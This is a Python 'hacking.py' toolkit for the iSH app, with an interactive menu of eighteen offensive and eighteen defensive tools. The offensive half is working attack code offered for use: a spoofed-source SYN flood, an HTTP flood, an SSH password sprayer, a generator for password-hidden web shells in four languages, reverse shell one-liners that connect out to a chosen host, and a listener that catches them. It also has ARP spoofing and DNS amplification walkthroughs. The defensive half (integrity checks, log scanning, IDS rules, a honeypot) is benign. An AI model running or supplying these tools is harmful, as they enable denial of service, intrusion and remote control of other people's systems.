#!/usr/bin/env python3
# hacking.py - all-in-one toolkit, offensive + defensive, iSH-ready
# target: iSH (Alpine Linux, aarch64) | python3 stdlib only
# usage: python3 /ish/hacking.py
# install once: apk add openssl sshpass

import os
import sys
import re
import socket
import ssl
import json
import time
import random
import string
import struct
import hashlib
import hmac
import base64
import binascii
import threading
import subprocess
import shutil
import itertools
import urllib.request
import urllib.parse
import urllib.error
import ipaddress
import http.client
import ftplib
import smtplib
import poplib
import telnetlib
from datetime import datetime
from queue import Queue

# ------------------------------------------------------------------
# utils
# ------------------------------------------------------------------

def hr(title):
    bar = "=" * 62
    print(f"\n{bar}\n  {title}\n{bar}")

def pause():
    try:
        input("\n[enter] ")
    except EOFError:
        pass

def run(cmd, timeout=30):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"[err] {e}"

def run_root(cmd):
    if os.geteuid() != 0:
        return f"[!] root required: sudo {cmd}"
    return run(cmd)

def have(binary):
    return shutil.which(binary) is not None

def ask(prompt, default=None):
    v = input(prompt).strip()
    return v if v else (default or "")

def sha256_file(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def is_ip(s):
    try:
        ipaddress.ip_address(s)
        return True
    except Exception:
        return False

def valid_host(h):
    return is_ip(h) or re.match(r"^[A-Za-z0-9._-]+$", h)

# ==================================================================
# OFFENSIVE  (01 - 18)
# ==================================================================

def t01_port_scan():
    hr("01 | TCP port scanner")
    host = ask("host: ")
    if not valid_host(host):
        print("[!] bad host")
        return
    spec = ask("ports (1-1024 or 22,80,443): ", "1-1024")
    plist = []
    if "-" in spec:
        try:
            a, b = spec.split("-")
            plist = list(range(int(a), int(b) + 1))
        except Exception:
            print("[!] bad range")
            return
    else:
        try:
            plist = [int(p) for p in spec.split(",")]
        except Exception:
            print("[!] bad list")
            return
    print(f"[*] scanning {host} ({len(plist)} ports)")
    openp = []
    for p in plist:
        s = socket.socket()
        s.settimeout(0.4)
        try:
            s.connect((host, p))
            openp.append(p)
            try:
                svc = socket.getservbyport(p)
            except Exception:
                svc = "?"
            print(f"  OPEN  {p:<6} {svc}")
        except Exception:
            pass
        finally:
            s.close()
    print(f"\n[*] {len(openp)} open")

def t02_banner_grab():
    hr("02 | banner grabber")
    host = ask("host: ")
    port = int(ask("port: ", "80"))
    probe = ask("probe bytes (blank=none): ", "")
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((host, port))
        if probe:
            s.send(probe.encode() + b"\r\n")
        else:
            s.send(b"\r\n")
        data = s.recv(4096)
        print(f"[+] {len(data)} bytes:")
        print(data.decode(errors="replace"))
    except Exception as e:
        print(f"[err] {e}")
    finally:
        s.close()

def t03_http_header_audit():
    hr("03 | HTTP header security audit")
    url = ask("url: ")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=8) as r:
            for k, v in r.headers.items():
                print(f"  {k}: {v}")
            required = ["Strict-Transport-Security",
                        "Content-Security-Policy",
                        "X-Frame-Options",
                        "X-Content-Type-Options",
                        "Referrer-Policy",
                        "Permissions-Policy"]
            present = [k.lower() for k in r.headers]
            missing = [h for h in required if h.lower() not in present]
            if missing:
                print(f"\n[!] missing: {', '.join(missing)}")
            else:
                print("\n[+] all recommended headers present")
    except Exception as e:
        print(f"[err] {e}")

def t04_dir_bruteforce():
    hr("04 | directory / path brute force")
    base = ask("base url (http://host): ").rstrip("/")
    custom = ask("wordlist file (blank=default): ", "")
    if custom and os.path.isfile(custom):
        words = [l.strip() for l in open(custom, errors="ignore") if l.strip()]
    else:
        words = ["admin", "login", "wp-admin", "wp-login.php", "api",
                 "backup", ".git", ".env", "config", "robots.txt",
                 "sitemap.xml", "phpmyadmin", "uploads", "test", "dev",
                 "staging", "old", "private", "secret", "db", "sql",
                 "phpinfo.php", "server-status", ".htaccess", "cgi-bin"]
    print(f"[*] {len(words)} paths")
    hits = 0
    for w in words:
        try:
            r = urllib.request.urlopen(f"{base}/{w}", timeout=3)
            print(f"  {r.status}  /{w}  ({len(r.read(256))}b)")
            hits += 1
        except urllib.error.HTTPError as e:
            if e.code != 404:
                print(f"  {e.code}  /{w}")
                hits += 1
        except Exception:
            pass
    print(f"\n[*] {hits} non-404 responses")

def t05_subdomain_enum():
    hr("05 | subdomain enumeration (DNS)")
    dom = ask("domain: ")
    custom = ask("wordlist file (blank=default): ", "")
    if custom and os.path.isfile(custom):
        subs = [l.strip() for l in open(custom, errors="ignore") if l.strip()]
    else:
        subs = ["www", "mail", "ftp", "admin", "api", "dev", "test",
                "staging", "blog", "shop", "vpn", "ns1", "ns2", "mx",
                "cdn", "static", "assets", "git", "portal", "app",
                "webmail", "smtp", "pop", "imap", "remote", "dns"]
    found = []
    for s in subs:
        try:
            ip = socket.gethostbyname(f"{s}.{dom}")
            print(f"  {s}.{dom} -> {ip}")
            found.append((s, ip))
        except Exception:
            pass
    print(f"\n[*] {len(found)} live")

def t06_hash_cracker_dict():
    hr("06 | hash cracker (dictionary)")
    h = ask("hash: ").lower()
    algo = ask("algo md5/sha1/sha256/sha512: ", "md5").lower()
    wl = ask("wordlist path: ")
    m = {"md5": hashlib.md5, "sha1": hashlib.sha1,
         "sha256": hashlib.sha256, "sha512": hashlib.sha512}
    if algo not in m:
        print("[!] unsupported")
        return
    if not os.path.isfile(wl):
        print("[!] wordlist missing")
        return
    fn = m[algo]
    n = 0
    with open(wl, errors="ignore") as f:
        for line in f:
            w = line.strip()
            n += 1
            if fn(w.encode()).hexdigest() == h:
                print(f"[+] cracked after {n}: {w}")
                return
    print(f"[!] not found in {n} candidates")

def t07_bruteforce_gen():
    hr("07 | brute force string generator")
    chars = ask("charset (e.g. abc123): ", "abc123")
    maxlen = int(ask("max length: ", "3"))
    out = ask("output file (blank=stdout): ", "")
    fh = open(out, "w") if out else None
    total = 0
    for n in range(1, maxlen + 1):
        for combo in itertools.product(chars, repeat=n):
            s = "".join(combo)
            if fh:
                fh.write(s + "\n")
            else:
                print(s)
            total += 1
    if fh:
        fh.close()
        print(f"[+] {total} strings -> {out}")

def t08_http_flood():
    hr("08 | HTTP flood (rate test)")
    url = ask("url: ")
    total = int(ask("total requests: ", "100"))
    threads = int(ask("threads: ", "10"))
    counter = {"ok": 0, "err": 0}
    lock = threading.Lock()
    def worker():
        while True:
            with lock:
                if counter["ok"] + counter["err"] >= total:
                    return
            try:
                urllib.request.urlopen(url, timeout=3)
                with lock: counter["ok"] += 1
            except Exception:
                with lock: counter["err"] += 1
    t0 = time.time()
    ts = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for t in ts: t.start()
    for t in ts: t.join()
    dt = time.time() - t0
    print(f"[*] {counter['ok']} ok, {counter['err']} err in {dt:.1f}s "
          f"({total/dt:.1f} rps)")

def t09_syn_flood():
    hr("09 | SYN flood (raw socket)")
    if os.geteuid() != 0:
        print("[!] root required")
        return
    dst = ask("target ip: ")
    dport = int(ask("port: ", "80"))
    count = int(ask("packets: ", "1000"))
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except Exception as e:
        print(f"[err] {e} — iSH blocks raw TCP; concept only")
        return
    for i in range(count):
        src = rand_ip()
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 2**32 - 1)
        ihl_ver = (4 << 4) + 5
        iph = struct.pack("!BBHHHBBH4s4s",
                          ihl_ver, 0, 40, random.randint(0, 65535),
                          0, 64, socket.IPPROTO_TCP, 0,
                          socket.inet_aton(src), socket.inet_aton(dst))
        tcp = struct.pack("!HHLLBBHHH",
                          sport, dport, seq, 0,
                          (5 << 4), 0x02, 5840, 0, 0)
        try:
            s.sendto(iph + tcp, (dst, 0))
        except Exception:
            break
        if i % 100 == 0:
            print(f"  sent {i}")
    print(f"[+] done ({count})")

def t10_dns_amplification_info():
    hr("10 | DNS amplification — technique reference")
    print("""
[*] vector:
  1. attacker spoofs source IP = victim
  2. sends DNS query to OPEN resolver for a large record
     (ANY, DNSSEC, TXT of a big zone)
  3. resolver sends 40-100x response to victim
[*] query shapes:
  dig ANY isc.org @resolver
  dig +bufsize=4096 +dnssec . DNSKEY @resolver
[*] scan for open resolvers:
  for ip in cidr: dig +short +time=1 test.openresolver.com @ip
[*] iSH cannot send spoofed UDP — this is a concept block, not a tool.
""")

def t11_arp_spoof_info():
    hr("11 | ARP spoof / MITM — technique reference")
    print("""
[*] step 1: enable forwarding
    sysctl -w net.ipv4.ip_forward=1
[*] step 2: poison target — 'gateway IP now at attacker MAC'
    arpspoof -i eth0 -t <victim> <gateway>
    arpspoof -i eth0 -t <gateway> <victim>
[*] step 3: capture
    tcpdump -i eth0 -w cap.pcap
    sslstrip -l 8080
[*] raw frame layout:
    dstMAC=target, srcMAC=attacker, ethertype=0x0806
    ARP op=2 (reply), senderIP=gw, senderMAC=attacker
[*] iSH cannot open AF_PACKET — concept only.
""")

def t12_ssh_spray():
    hr("12 | SSH password spray")
    if not have("sshpass"):
        print("[!] apk add sshpass")
        return
    host = ask("host: ")
    users = [u.strip() for u in ask("users (comma): ").split(",")]
    pw = ask("password: ")
    for u in users:
        cmd = (f"sshpass -p '{pw}' ssh "
               f"-o StrictHostKeyChecking=no -o ConnectTimeout=3 "
               f"-o PreferredAuthentications=password "
               f"{u}@{host} 'echo HIT'")
        out = run(cmd, timeout=10)
        print(f"  {u:<16} {'HIT' if 'HIT' in out else 'miss'}")

def t13_web_shell_gen():
    hr("13 | web shell generator")
    kind = ask("php / jsp / asp / python: ", "php").lower()
    pw = ask("password: ", "pwn")
    if kind == "php":
        h = hashlib.md5(pw.encode()).hexdigest()
        body = f"""<?php
if(isset($_POST['p']) && md5($_POST['p'])=='{h}'){{
  echo "<pre>";
  system($_POST['c']);
  echo "</pre>";
}} else {{
  header('HTTP/1.0 404 Not Found'); echo 'Not Found';
}}?>
"""
        fn = "shell.php"
    elif kind == "jsp":
        body = f"""<%@ page import="java.util.*,java.io.*"%>
<%
if(request.getParameter("p")!=null && request.getParameter("p").equals("{pw}")){{
  Process p = Runtime.getRuntime().exec(request.getParameter("c"));
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l; while((l=br.readLine())!=null) out.println(l);
}}%>
"""
        fn = "shell.jsp"
    elif kind == "asp":
        body = f"""<%
If Request.Form("p")="{pw}" Then
  Set o = Server.CreateObject("WScript.Shell")
  Set e = o.Exec(Request.Form("c"))
  Response.Write("<pre>" & e.StdOut.ReadAll & "</pre>")
End If
%>
"""
        fn = "shell.asp"
    else:
        body = f"""#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess, urllib.parse
PW = "{pw}"
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        d = urllib.parse.parse_qs(self.rfile.read(n).decode())
        if d.get('p', [''])[0] == PW:
            o = subprocess.run(d.get('c', ['id'])[0], shell=True,
                               capture_output=True, text=True)
            self.send_response(200); self.end_headers()
            self.wfile.write((o.stdout + o.stderr).encode())
        else:
            self.send_response(404); self.end_headers()
HTTPServer(('0.0.0.0', 8000), H).serve_forever()
"""
        fn = "shell.py"
    open(fn, "w").write(body)
    print(f"[+] wrote {fn}  (POST p={pw}&c=id)")

def t14_reverse_shell_gen():
    hr("14 | reverse shell one-liners")
    lh = ask("your ip: ")
    lp = ask("your port: ", "4444")
    print(f"""
bash tcp:   bash -i >& /dev/tcp/{lh}/{lp} 0>&1
bash -c:    bash -c 'bash -i >& /dev/tcp/{lh}/{lp} 0>&1'
python:     python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lh}",{lp}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
nc -e:      nc -e /bin/sh {lh} {lp}
nc fifo:    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lh} {lp} >/tmp/f
perl:       perl -e 'use Socket;$i="{lh}";$p={lp};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php:        php -r '$s=fsockopen("{lh}",{lp});exec("/bin/sh -i <&3 >&3 2>&3");'
ruby:       ruby -rsocket -e 'f=TCPSocket.open("{lh}",{lp}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
powershell: powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('{lh}',{lp});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()"
""")

def t15_reverse_listener():
    hr("15 | reverse shell listener")
    port = int(ask("listen port: ", "4444"))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    print(f"[*] listening on {port}")
    c, a = s.accept()
    print(f"[+] connection from {a}")
    c.settimeout(0.5)
    while True:
        try:
            cmd = input("$ ")
        except EOFError:
            break
        if cmd.strip() in ("exit", "quit"):
            break
        c.send((cmd + "\n").encode())
        time.sleep(0.3)
        buf = b""
        while True:
            try:
                d = c.recv(4096)
                if not d:
                    break
                buf += d
            except socket.timeout:
                break
        print(buf.decode(errors="replace"), end="")
    c.close()

def t16_ssl_scan():
    hr("16 | TLS scanner / cipher probe")
    host = ask("host: ")
    port = int(ask("port: ", "443"))
    versions = [("TLSv1.0", ssl.TLSVersion.TLSv1),
                ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
                ("TLSv1.2", ssl.TLSVersion.TLSv1_2),
                ("TLSv1.3", ssl.TLSVersion.TLSv1_3)]
    for name, ver in versions:
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.minimum_version = ver
            ctx.maximum_version = ver
            with socket.create_connection((host, port), timeout=4) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ss:
                    print(f"  [+] {name}  cipher={ss.cipher()[0]}")
        except Exception as e:
            print(f"  [-] {name}  {type(e).__name__}")

def t17_ftp_login():
    hr("17 | FTP login tester")
    host = ask("host: ")
    user = ask("user: ", "anonymous")
    pw = ask("pass: ", "anonymous")
    try:
        ftp = ftplib.FTP(host, timeout=8)
        ftp.login(user, pw)
        print("[+] login ok")
        ftp.retrlines("LIST")
        ftp.quit()
    except Exception as e:
        print(f"[err] {e}")

def t18_smtp_user_enum():
    hr("18 | SMTP user enum (VRFY)")
    host = ask("smtp host: ")
    port = int(ask("port: ", "25"))
    users = [u.strip() for u in ask("users (comma): ").split(",")]
    try:
        s = smtplib.SMTP(host, port, timeout=8)
        s.ehlo("test")
        for u in users:
            code, msg = s.verify(u)
            print(f"  {u:<20} {code} {msg.decode(errors='replace')[:60]}")
        s.quit()
    except Exception as e:
        print(f"[err] {e}")

# ==================================================================
# DEFENSIVE  (19 - 36)
# ==================================================================

def t19_port_watch():
    hr("19 | port watch monitor")
    ports = [int(p) for p in ask("ports (comma): ", "22,80,443").split(",")]
    dur = int(ask("duration seconds (0=forever): ", "60"))
    t0 = time.time()
    state = {p: None for p in ports}
    while dur == 0 or time.time() - t0 < dur:
        for p in ports:
            s = socket.socket()
            s.settimeout(0.4)
            try:
                s.connect(("127.0.0.1", p))
                now = "open"
            except Exception:
                now = "closed"
            finally:
                s.close()
            if state[p] != now:
                print(f"  [{datetime.now():%H:%M:%S}] {p} -> {now}")
                state[p] = now
        time.sleep(2)

def t20_file_integrity():
    hr("20 | file integrity checker")
    path = ask("dir or file: ")
    db = ask("baseline file: ", "integrity.json")
    if not os.path.exists(path):
        print("[!] path missing")
        return
    cur = {}
    if os.path.isfile(path):
        cur[path] = sha256_file(path)
    else:
        for root, _, files in os.walk(path):
            for f in files:
                fp = os.path.join(root, f)
                try:
                    cur[fp] = sha256_file(fp)
                except Exception:
                    pass
    if not os.path.exists(db):
        json.dump(cur, open(db, "w"))
        print(f"[+] baseline saved ({len(cur)} files)")
        return
    old = json.load(open(db))
    new = changed = deleted = 0
    for f, h in cur.items():
        if f not in old:
            print(f"[+] NEW     {f}")
            new += 1
        elif old[f] != h:
            print(f"[!] CHANGED {f}")
            changed += 1
    for f in old:
        if f not in cur:
            print(f"[-] DELETED {f}")
            deleted += 1
    print(f"\n[*] {new} new, {changed} changed, {deleted} deleted")

def t21_log_scan():
    hr("21 | log scanner")
    path = ask("log path: ")
    if not os.path.isfile(path):
        print("[!] missing")
        return
    pat = re.compile(r"(Failed password|Invalid user|authentication failure"
                     r"|BREAK-IN|refused|denied|segfault)", re.I)
    n = 0
    with open(path, errors="ignore") as f:
        for i, line in enumerate(f, 1):
            if pat.search(line):
                print(f"  {i:>6}: {line.rstrip()[:110]}")
                n += 1
    print(f"\n[*] {n} suspicious lines")

def t22_process_audit():
    hr("22 | process + network audit")
    print("--- processes ---")
    print(run("ps aux 2>/dev/null || ps -ef 2>/dev/null"))
    print("--- listening ---")
    print(run("netstat -tunlp 2>/dev/null || ss -tunlp 2>/dev/null "
              "|| echo 'no netstat/ss'"))
    print("--- cron ---")
    print(run("crontab -l 2>/dev/null || echo none"))

def t23_password_hasher():
    hr("23 | password hasher")
    pw = ask("password: ")
    salt = os.urandom(16)
    print(f"md5:     {hashlib.md5(pw.encode()).hexdigest()}")
    print(f"sha1:    {hashlib.sha1(pw.encode()).hexdigest()}")
    print(f"sha256:  {hashlib.sha256(pw.encode()).hexdigest()}")
    print(f"sha512:  {hashlib.sha512(pw.encode()).hexdigest()}")
    print(f"pbkdf2:  {hashlib.pbkdf2_hmac('sha256', pw.encode(), salt, 200000).hex()}")
    print(f"scrypt:  {hashlib.scrypt(pw.encode(), salt=salt, n=2**14, r=8, p=1).hex()[:64]}...")

def t24_password_strength():
    hr("24 | password strength audit")
    pw = ask("password: ")
    score = 0
    notes = []
    if len(pw) >= 12: score += 1
    else: notes.append("short (<12)")
    if len(pw) >= 16: score += 1
    if re.search(r"[a-z]", pw): score += 1
    else: notes.append("no lowercase")
    if re.search(r"[A-Z]", pw): score += 1
    else: notes.append("no uppercase")
    if re.search(r"\d", pw): score += 1
    else: notes.append("no digit")
    if re.search(r"[^A-Za-z0-9]", pw): score += 1
    else: notes.append("no symbol")
    common = ["password", "123456", "qwerty", "admin", "letmein",
              "welcome", "monkey", "dragon", "abc123"]
    if pw.lower() in common:
        score = 0
        notes.append("common password")
    label = "WEAK" if score < 4 else "OK" if score < 6 else "STRONG"
    print(f"score: {score}/6  [{label}]")
    if notes:
        print(f"notes: {', '.join(notes)}")

def t25_tls_cert_check():
    hr("25 | TLS certificate inspector")
    host = ask("host: ")
    port = int(ask("port: ", "443"))
    ctx = ssl.create_default_context()
    try:
        with socket.create_connection((host, port), timeout=6) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                cert = ss.getpeercert()
                print(f"  subject:  {cert.get('subject')}")
                print(f"  issuer:   {cert.get('issuer')}")
                print(f"  notBefore:{cert.get('notBefore')}")
                print(f"  notAfter: {cert.get('notAfter')}")
                print(f"  tls:      {ss.version()}")
                print(f"  cipher:   {ss.cipher()}")
                print(f"  SAN:      {cert.get('subjectAltName')}")
    except Exception as e:
        print(f"[err] {e}")

def t26_url_reputation():
    hr("26 | URL heuristic scan")
    url = ask("url: ")
    flags = []
    if re.search(r"https?://\d{1,3}(\.\d{1,3}){3}", url):
        flags.append("raw IP host")
    if len(url) > 75:
        flags.append("long url")
    if "@" in url:
        flags.append("@ obfuscation")
    if url.count("-") > 3:
        flags.append("many hyphens")
    if re.search(r"\.(tk|ml|ga|cf|gq|zip|mov)$", url, re.I):
        flags.append("abuse-prone TLD")
    if any(k in url.lower() for k in
           ["login", "verify", "secure", "update", "account",
            "signin", "confirm", "wallet", "bank"]):
        flags.append("phish keyword")
    if re.search(r"%[0-9a-f]{2}%[0-9a-f]{2}", url, re.I):
        flags.append("double-encoded")
    print(f"flags: {flags if flags else 'none'}")
    print(f"score: {len(flags)}/7")

def t27_firewall_helper():
    hr("27 | firewall rule reference (iptables / nft)")
    print("""
[*] iptables — block single IP
    iptables -A INPUT -s 1.2.3.4 -j DROP
[*] allow only SSH + established
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    iptables -A INPUT -p tcp --dport 22 -j ACCEPT
    iptables -A INPUT -j DROP
[*] rate-limit SSH
    iptables -A INPUT -p tcp --dport 22 -m limit --limit 4/min -j ACCEPT
[*] log drops
    iptables -A INPUT -j LOG --log-prefix "DROP: "
[*] save / restore
    iptables-save > /etc/iptables.rules
    iptables-restore < /etc/iptables.rules
[*] nftables equivalent
    nft add rule inet filter input ip saddr 1.2.3.4 drop
[*] iSH has no netfilter — reference only.
""")

def t28_ids_patterns():
    hr("28 | IDS rule patterns (Suricata / Snort)")
    print("""
alert tcp any any -> $HOME_NET 22 (msg:"SSH brute force"; \\
  flow:to_server; threshold:type both,track by_src,count 5,seconds 60; \\
  sid:1000001; rev:1;)

alert http any any -> $HOME_NET any (msg:"SQLi UNION SELECT"; \\
  flow:to_server,established; content:"UNION SELECT"; nocase; \\
  sid:1000002; rev:1;)

alert http any any -> $HOME_NET any (msg:"path traversal"; \\
  content:"../"; content:"..%2f"; nocase; sid:1000003; rev:1;)

alert http any any -> $HOME_NET any (msg:"webshell POST"; \\
  content:"POST"; http_method; content:"cmd="; nocase; \\
  sid:1000004; rev:1;)

alert tcp any any -> $HOME_NET any (msg:"Meterpreter stage"; \\
  content:"|4d5a|"; offset:0; depth:2; flow:to_server; \\
  sid:1000005; rev:1;)
""")

def t29_honeypot():
    hr("29 | TCP honeypot")
    port = int(ask("port: ", "2222"))
    dur = int(ask("duration seconds (0=forever): ", "0"))
    banner = ask("banner: ", "SSH-2.0-OpenSSH_8.0")
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    s.settimeout(1.0)
    print(f"[*] honeypot on {port}")
    t0 = time.time()
    def handle(c, a):
        print(f"[+] {datetime.now():%H:%M:%S} connection from {a}")
        try:
            c.send((banner + "\r\n").encode())
            for _ in range(20):
                d = c.recv(512)
                if not d:
                    break
                print(f"  {a[0]} > {d[:100]!r}")
        except Exception:
            pass
        c.close()
    while dur == 0 or time.time() - t0 < dur:
        try:
            c, a = s.accept()
            threading.Thread(target=handle, args=(c, a), daemon=True).start()
        except socket.timeout:
            continue
    s.close()

def t30_backup_gen():
    hr("30 | backup generator")
    src = ask("source dir: ")
    dst = ask("dest dir: ")
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs(dst, exist_ok=True)
    out = f"{dst}/backup_{ts}.tar.gz"
    parent = os.path.dirname(src.rstrip("/")) or "."
    name = os.path.basename(src.rstrip("/"))
    run(f"tar czf {out} -C {parent} {name}")
    if os.path.exists(out):
        size = os.path.getsize(out) / 1024
        print(f"[+] {out}  ({size:.1f} KB)")
    else:
        print("[err] tar failed")

def t31_secure_delete():
    hr("31 | secure delete")
    path = ask("file: ")
    if not os.path.isfile(path):
        print("[!] not a file")
        return
    passes = int(ask("passes: ", "3"))
    size = os.path.getsize(path)
    with open(path, "r+b") as f:
        for i in range(passes):
            f.seek(0)
            f.write(os.urandom(size))
            f.flush()
            os.fsync(f.fileno())
            print(f"  pass {i+1}/{passes}")
    os.remove(path)
    print(f"[+] shredded {path} ({size} bytes)")

def t32_file_crypt():
    hr("32 | file encrypt / decrypt (openssl)")
    if not have("openssl"):
        print("[!] apk add openssl")
        return
    mode = ask("(e)ncrypt / (d)ecrypt: ").lower()
    path = ask("file: ")
    pw = ask("password: ")
    if mode == "e":
        out = path + ".enc"
        print(run(f"openssl enc -aes-256-cbc -pbkdf2 -salt "
                  f"-in {path} -out {out} -pass pass:{pw}"))
        print(f"[+] {out}")
    else:
        out = path + ".dec"
        print(run(f"openssl enc -d -aes-256-cbc -pbkdf2 "
                  f"-in {path} -out {out} -pass pass:{pw}"))
        print(f"[+] {out}")

def t33_network_map():
    hr("33 | local network map")
    iface = run("ip route 2>/dev/null | grep default | awk '{print $5}'").strip()
    if not iface:
        iface = "eth0"
    cidr = run(f"ip -4 addr show {iface} 2>/dev/null | "
               f"grep inet | awk '{{print $2}}'").strip()
    print(f"[*] iface {iface}  cidr {cidr or 'unknown'}")
    if not cidr:
        print("[!] cannot determine subnet")
        return
    try:
        net = ipaddress.ip_network(cidr, strict=False)
    except Exception:
        print("[!] bad cidr")
        return
    hosts = list(net.hosts())[:64]
    print(f"[*] probing {len(hosts)} hosts")
    for ip in hosts:
        r = run(f"ping -c1 -W1 {ip} 2>/dev/null | grep -c 'bytes from'", timeout=3)
        if r.strip() and r.strip() != "0":
            print(f"  [+] {ip}")

def t34_pcap_analyze():
    hr("34 | pcap analyzer (text output from tcpdump -r)")
    if not have("tcpdump"):
        print("[!] apk add tcpdump")
        return
    path = ask("pcap file: ")
    if not os.path.isfile(path):
        print("[!] missing")
        return
    print(run(f"tcpdump -nn -r {path} 2>/dev/null | head -100"))

def t35_password_policy_gen():
    hr("35 | password policy generator")
    length = int(ask("min length: ", "14"))
    require = ask("require (lower,upper,digit,symbol) comma: ",
                  "lower,upper,digit,symbol").split(",")
    print(f"""
[*] recommended policy:
    min length:    {length}
    require:       {', '.join(r.strip() for r in require)}
    rotation:      90 days (or on compromise)
    history:       12 previous
    lockout:       5 attempts / 15 min
    mfa:           required for admin + remote

[*] nist sp800-63b:
    - do NOT require periodic rotation
    - do NOT compose rules (length > complexity)
    - DO check against breached-password lists
    - DO allow 64+ char passphrases
""")

def t36_audit_report():
    hr("36 | system audit report")
    print(f"time:    {datetime.now()}")
    print(f"host:    {socket.gethostname()}")
    print(f"user:    {os.getuid()} ({os.getlogin() if hasattr(os,'getlogin') else '?'})")
    print(f"python:  {sys.version.split()[0]}")
    print(f"cwd:     {os.getcwd()}")
    print("--- uname ---")
    print(run("uname -a"))
    print("--- disk ---")
    print(run("df -h 2>/dev/null"))
    print("--- users with shells ---")
    print(run("grep -E '/(sh|bash|zsh)$' /etc/passwd 2>/dev/null"))
    print("--- suid files ---")
    print(run("find / -perm -4000 -type f 2>/dev/null | head -20"))
    print("--- world-writable ---")
    print(run("find /tmp /var/tmp -perm -0002 -type f 2>/dev/null | head -20"))

# ==================================================================
# registry + menu
# ==================================================================

TOOLS = [
    ("01", "TCP port scanner",            t01_port_scan),
    ("02", "Banner grabber",              t02_banner_grab),
    ("03", "HTTP header audit",           t03_http_header_audit),
    ("04", "Directory brute force",       t04_dir_bruteforce),
    ("05", "Subdomain enum",              t05_subdomain_enum),
    ("06", "Hash cracker (dict)",         t06_hash_cracker_dict),
    ("07", "Brute force generator",       t07_bruteforce_gen),
    ("08", "HTTP flood",                  t08_http_flood),
    ("09", "SYN flood (raw)",             t09_syn_flood),
    ("10", "DNS amplification info",      t10_dns_amplification_info),
    ("11", "ARP spoof info",              t11_arp_spoof_info),
    ("12", "SSH password spray",          t12_ssh_spray),
    ("13", "Web shell generator",         t13_web_shell_gen),
    ("14", "Reverse shell one-liners",    t14_reverse_shell_gen),
    ("15", "Reverse shell listener",      t15_reverse_listener),
    ("16", "TLS scanner",                 t16_ssl_scan),
    ("17", "FTP login tester",            t17_ftp_login),
    ("18", "SMTP user enum",              t18_smtp_user_enum),
    ("19", "Port watch monitor",          t19_port_watch),
    ("20", "File integrity checker",      t20_file_integrity),
    ("21", "Log scanner",                 t21_log_scan),
    ("22", "Process + network audit",     t22_process_audit),
    ("23", "Password hasher",             t23_password_hasher),
    ("24", "Password strength audit",     t24_password_strength),
    ("25", "TLS certificate inspector",   t25_tls_cert_check),
    ("26", "URL heuristic scan",          t26_url_reputation),
    ("27", "Firewall rule reference",     t27_firewall_helper),
    ("28", "IDS rule patterns",           t28_ids_patterns),
    ("29", "TCP honeypot",                t29_honeypot),
    ("30", "Backup generator",            t30_backup_gen),
    ("31", "Secure delete",               t31_secure_delete),
    ("32", "File encrypt / decrypt",      t32_file_crypt),
    ("33", "Local network map",           t33_network_map),
    ("34", "pcap analyzer",               t34_pcap_analyze),
    ("35", "Password policy generator",   t35_password_policy_gen),
    ("36", "System audit report",         t36_audit_report),
]

def show_menu():
    hr("hacking.py | 36 tools | iSH")
    print("  OFFENSIVE")
    for n, name, _ in TOOLS[:18]:
        print(f"    {n}  {name}")
    print("  DEFENSIVE")
    for n, name, _ in TOOLS[18:]:
        print(f"    {n}  {name}")
    print("\n   m  menu again")
    print("   i  system info")
    print("   q  quit")

def main():
    show_menu()
    while True:
        try:
            c = input("\n> ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if c in ("q", "quit", "exit"):
            break
        if c == "m":
            show_menu()
            continue
        if c == "i":
            t36_audit_report()
            pause()
            continue
        hit = None
        for n, _, fn in TOOLS:
            if c == n:
                hit = fn
                break
        if not hit:
            print("[!] unknown")
            continue
        try:
            hit()
        except KeyboardInterrupt:
            print("\n[!] aborted")
        except Exception as e:
            print(f"[err] {type(e).__name__}: {e}")
        pause()

if __name__ == "__main__":
    main()
